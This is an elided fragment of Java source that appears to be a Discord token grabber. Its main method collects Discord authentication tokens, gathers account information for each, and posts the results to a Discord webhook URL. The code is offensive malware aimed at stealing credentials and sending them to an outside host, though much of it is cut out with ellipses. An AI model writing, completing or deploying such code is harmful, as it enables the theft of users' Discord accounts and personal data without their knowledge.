...
public class Main {
    ...
    public static void main(String[] args) throws Exception {
        ...
        if (send_embed) {
            for (String token : getTokens(ensure_valid)) {
                sendEmbed(grabTokenInformation(discord_avatar_url, discord_username, token), discord_webhook_url);
            }
        } else {
    ...
    private static String grabTokenInformation(String avatar_url, String username, String token) throws IOException {
        //Account Information
